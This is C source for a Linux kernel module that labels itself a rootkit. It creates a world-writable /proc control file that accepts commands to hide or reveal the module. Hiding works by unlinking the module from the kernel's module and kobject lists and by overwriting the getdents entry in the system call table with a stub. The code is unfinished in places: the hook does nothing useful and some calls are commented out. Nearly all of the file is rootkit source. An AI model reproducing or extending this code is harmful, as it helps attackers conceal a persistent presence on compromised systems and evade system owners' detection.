#include "ker_mod.h"

static struct proc_dir_entry *proc_rtkit;
static struct proc_dir_entry *proc_root;

static char module_hidden = 0;
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static int temp;
static char desc[50];

extern void* sys_call_table[];

static int getdents_hook() {
	return 0;
}

void module_hide(void) {
		/* The module is already hidden, do nothing. */
		if(module_hidden) return;

		module_previous = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
		//kobject_del(&THIS_MODULE->mkobj.kobj);
		// To do : hook getdents
		sys_call_table[SYS_getdents] = getdents_hook;
		list_del(&THIS_MODULE->mkobj.kobj.entry);
		module_hidden = !module_hidden;
		printk(KERN_INFO "Module hidden\n");
}

void module_show(void) {
		/* The module is not hidden yet, nothing more to show. */
		if(!module_hidden) return;

		list_add(&THIS_MODULE->list, module_previous);
		//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
		list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
		module_hidden = !module_hidden;
		printk(KERN_INFO "Module no longer hidden\n");
}

static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos) {
		if(count > temp)
				count = temp;
		temp -= count;

		copy_to_user(buffer, desc, count);

		if(count == 0) {
				sprintf(desc, "test\n");
				temp = strlen(desc);
		}

		return count;
}

static ssize_t rtkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos) {
		if(!strncmp(buffer, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD))) {
				module_hide();
		} else if(!strncmp(buffer, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD))) {
				module_show();
		}
		return count;
}

static const struct file_operations rootkit_fops = {
		.owner = THIS_MODULE,
		.read = rtkit_read,
		.write = rtkit_write,
};

/* Initialize proc file system */
static int procfs_init(void) {
		proc_rtkit = proc_create(MODULE_NAME, 0666, NULL, &rootkit_fops);
		if(proc_rtkit == NULL)
				return 0;
		proc_root = proc_rtkit->parent;
		if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
				return 0;

		sprintf(desc, "test\n");
		temp = strlen(desc);

		return 1;
}

static void procfs_clean(void) {
		if(proc_rtkit != NULL) {
				remove_proc_entry(MODULE_NAME, NULL);
				proc_rtkit = NULL;
		}
}

/* Init function, called when the module is loaded */
static int __init rootkit_init(void) {
		if(!procfs_init()) {
				procfs_clean();
				return 1;
		}
		printk(KERN_INFO "Loading rootkit\n");
		return 0;
}

/* Exit function, called when the module is unloaded */
static void __exit rootkit_exit(void) {
		module_show();
		procfs_clean();
		printk(KERN_INFO "Closing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
